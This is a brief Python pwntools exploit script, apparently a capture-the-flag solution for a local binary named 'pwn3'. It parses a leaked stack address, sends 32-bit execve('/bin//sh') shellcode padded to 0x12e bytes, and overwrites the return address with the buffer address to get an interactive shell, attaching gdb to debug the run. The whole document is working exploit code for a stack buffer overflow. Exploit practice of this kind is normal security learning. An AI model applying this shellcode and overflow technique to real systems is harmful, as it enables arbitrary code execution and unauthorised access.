from pwn import *

target = process("./pwn3")

gdb.attach(target, gdbscript='b *echo+64')

target.recvuntil(b"journey ")

leak = target.recvline().strip(b"!\n")

print(leak)

buffer_addr = int(leak, 16)


# Missing cleared edx
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

padding = b"0"*(0x12e - len(shellcode))

target.sendline(shellcode + padding + p32(buffer_addr))

target.interactive()